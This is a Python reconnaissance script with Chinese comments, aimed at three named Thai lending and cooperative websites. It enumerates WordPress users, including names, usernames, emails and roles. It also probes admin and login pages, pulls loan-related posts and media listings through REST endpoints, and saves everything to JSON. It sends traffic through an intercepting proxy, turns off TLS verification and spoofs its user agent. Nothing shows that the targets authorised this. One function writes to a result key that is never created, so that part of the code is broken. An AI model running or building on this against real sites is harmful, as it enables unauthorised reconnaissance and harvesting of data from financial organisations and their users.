"""
增强贷款数据提取器
专门针对泰国金融网站提取贷款相关数据
"""

import requests
import json
import time
from datetime import datetime
from typing import Dict, List, Any, Optional

class EnhancedLoanDataExtractor:
    def __init__(self):
        self.session = requests.Session()
        self.proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
    def extract_loan_data(self, target_url: str) -> Dict[str, Any]:
        """提取贷款相关数据"""
        
        loan_data = {
            'target': target_url,
            'timestamp': datetime.now().isoformat(),
            'loan_products': [],
            'loan_announcements': [],
            'financial_info': [],
            'api_endpoints': [],
            'admin_access': [],
            'user_data': []
        }
        
        try:
            # 测试贷款相关API端点
            loan_endpoints = [
                '/wp-json/wp/v2/posts?categories=12',  # 公告类别
                '/wp-json/wp/v2/pages?search=loan',
                '/wp-json/wp/v2/pages?search=credit',
                '/wp-json/wp/v2/pages?search=สินเชื่อ',
                '/wp-json/wp/v2/pages?search=เงินกู้',
                '/api/loan',
                '/api/credit',
                '/api/finance',
                '/api/member',
                '/wp-admin/admin-ajax.php'
            ]
            
            for endpoint in loan_endpoints:
                try:
                    url = f"{target_url}{endpoint}"
                    response = self.session.get(
                        url, 
                        proxies=self.proxies, 
                        timeout=10, 
                        verify=False,
                        headers=self.headers
                    )
                    
                    if response.status_code == 200:
                        data = response.json()
                        loan_data['api_endpoints'].append({
                            'endpoint': endpoint,
                            'status': 'accessible',
                            'data_count': len(data) if isinstance(data, list) else 1,
                            'sample_data': data[:3] if isinstance(data, list) and len(data) > 3 else data
                        })
                        
                        # 分析贷款相关内容
                        self._analyze_loan_content(data, loan_data)
                        
                except Exception as e:
                    loan_data['api_endpoints'].append({
                        'endpoint': endpoint,
                        'status': 'error',
                        'error': str(e)
                    })
            
            # 提取WordPress用户数据
            self._extract_users(target_url, loan_data)
            
            # 提取媒体文件信息
            self._extract_media_files(target_url, loan_data)
            
            # 测试管理页面访问
            self._test_admin_pages(target_url, loan_data)
            
            # 搜索贷款相关页面
            self._search_loan_pages(target_url, loan_data)
            
        except Exception as e:
            loan_data['error'] = str(e)
            
        return loan_data
    
    def _analyze_loan_content(self, data: Any, loan_data: Dict[str, Any]):
        """分析贷款相关内容"""
        
        if isinstance(data, list):
            for item in data:
                if isinstance(item, dict):
                    # 检查标题和内容中的贷款关键词
                    title = item.get('title', {}).get('rendered', '')
                    content = item.get('content', {}).get('rendered', '')
                    
                    loan_keywords = [
                        'สินเชื่อ', 'เงินกู้', 'เงินฝาก', 'ดอกเบี้ย', 'ออมทรัพย์',
                        'loan', 'credit', 'deposit', 'interest', 'savings',
                        'เจ้าหน้าที่สินเชื่อ', 'การเงิน', 'ธนาคาร', 'สหกรณ์',
                        'ประกาศ', 'สอบราคา', 'ประมูล', 'ประกัน', 'เกษียณ'
                    ]
                    
                    for keyword in loan_keywords:
                        if keyword in title.lower() or keyword in content.lower():
                            if 'สินเชื่อ' in keyword or 'เงินกู้' in keyword or 'loan' in keyword:
                                loan_data['loan_products'].append({
                                    'title': title,
                                    'content_preview': content[:500],
                                    'link': item.get('link', ''),
                                    'date': item.get('date', ''),
                                    'type': 'loan_product'
                                })
                            elif 'ประกาศ' in keyword or 'สอบราคา' in keyword:
                                loan_data['loan_announcements'].append({
                                    'title': title,
                                    'content_preview': content[:500],
                                    'link': item.get('link', ''),
                                    'date': item.get('date', ''),
                                    'type': 'announcement'
                                })
                            elif 'เงินฝาก' in keyword or 'ออมทรัพย์' in keyword or 'deposit' in keyword:
                                loan_data['financial_info'].append({
                                    'title': title,
                                    'content_preview': content[:500],
                                    'link': item.get('link', ''),
                                    'date': item.get('date', ''),
                                    'type': 'financial_service'
                                })
                            break
    
    def _extract_users(self, target_url: str, loan_data: Dict[str, Any]):
        """提取用户数据"""
        try:
            users_url = f"{target_url}/wp-json/wp/v2/users"
            response = self.session.get(
                users_url, 
                proxies=self.proxies, 
                timeout=10, 
                verify=False,
                headers=self.headers
            )
            
            if response.status_code == 200:
                users = response.json()
                for user in users:
                    loan_data['user_data'].append({
                        'id': user.get('id'),
                        'name': user.get('name'),
                        'username': user.get('slug'),
                        'email': user.get('email', ''),
                        'roles': user.get('roles', []),
                        'link': user.get('link', '')
                    })
        except Exception as e:
            loan_data['user_data'].append({'error': str(e)})
    
    def _extract_media_files(self, target_url: str, loan_data: Dict[str, Any]):
        """提取媒体文件信息"""
        try:
            media_url = f"{target_url}/wp-json/wp/v2/media"
            response = self.session.get(
                media_url, 
                proxies=self.proxies, 
                timeout=10, 
                verify=False,
                headers=self.headers
            )
            
            if response.status_code == 200:
                media_items = response.json()
                for media in media_items[:10]:  # 只取前10个
                    loan_data['financial_info'].append({
                        'type': 'media_file',
                        'title': media.get('title', {}).get('rendered', ''),
                        'url': media.get('source_url', ''),
                        'date': media.get('date', ''),
                        'file_type': media.get('mime_type', '')
                    })
        except Exception as e:
            pass
    
    def _test_admin_pages(self, target_url: str, loan_data: Dict[str, Any]):
        """测试管理页面访问"""
        admin_pages = [
            '/wp-admin/',
            '/admin/',
            '/dashboard/',
            '/control/',
            '/manage/',
            '/administrator/',
            '/login/',
            '/wp-login.php'
        ]
        
        for page in admin_pages:
            try:
                url = f"{target_url}{page}"
                response = self.session.get(
                    url, 
                    proxies=self.proxies, 
                    timeout=5, 
                    verify=False,
                    headers=self.headers
                )
                
                loan_data['admin_access'].append({
                    'page': page,
                    'status_code': response.status_code,
                    'accessible': response.status_code == 200,
                    'content_length': len(response.text)
                })
            except Exception as e:
                loan_data['admin_access'].append({
                    'page': page,
                    'status_code': 'error',
                    'accessible': False,
                    'error': str(e)
                })
    
    def _search_loan_pages(self, target_url: str, loan_data: Dict[str, Any]):
        """搜索贷款相关页面"""
        loan_search_terms = [
            'สินเชื่อ', 'เงินกู้', 'เงินฝาก', 'ออมทรัพย์', 'ดอกเบี้ย',
            'loan', 'credit', 'deposit', 'savings', 'interest'
        ]
        
        for term in loan_search_terms:
            try:
                search_url = f"{target_url}/wp-json/wp/v2/posts?search={term}"
                response = self.session.get(
                    search_url, 
                    proxies=self.proxies, 
                    timeout=10, 
                    verify=False,
                    headers=self.headers
                )
                
                if response.status_code == 200:
                    results = response.json()
                    for result in results:
                        loan_data['member_services'].append({
                            'search_term': term,
                            'title': result.get('title', {}).get('rendered', ''),
                            'link': result.get('link', ''),
                            'date': result.get('date', ''),
                            'content_preview': result.get('content', {}).get('rendered', '')[:300]
                        })
            except Exception as e:
                pass

def main():
    extractor = EnhancedLoanDataExtractor()
    
    targets = [
        "https://peacoop.or.th",
        "https://mula-x.com", 
        "https://ngoenmun.com"
    ]
    
    all_loan_data = {}
    
    for target in targets:
        print(f"正在提取 {target} 的贷款数据...")
        try:
            data = extractor.extract_loan_data(target)
            all_loan_data[target] = data
            print(f"成功提取 {target} 的数据")
        except Exception as e:
            print(f"提取 {target} 数据时出错: {e}")
            all_loan_data[target] = {'error': str(e)}
    
    # 保存数据
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"ENHANCED_LOAN_DATA_{timestamp}.json"
    
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(all_loan_data, f, ensure_ascii=False, indent=2)
    
    print(f"贷款数据已保存到: {filename}")
    
    # 生成汇总报告
    total_loan_products = 0
    total_announcements = 0
    total_users = 0
    
    for target, data in all_loan_data.items():
        if 'loan_products' in data:
            total_loan_products += len(data['loan_products'])
        if 'loan_announcements' in data:
            total_announcements += len(data['loan_announcements'])
        if 'user_data' in data:
            total_users += len(data['user_data'])
    
    print(f"\n=== 贷款数据提取汇总 ===")
    print(f"目标站点数量: {len(targets)}")
    print(f"贷款产品数量: {total_loan_products}")
    print(f"贷款公告数量: {total_announcements}")
    print(f"用户数据数量: {total_users}")
    print(f"API端点访问: {sum(len(data.get('api_endpoints', [])) for data in all_loan_data.values())}")

if __name__ == "__main__":
    main()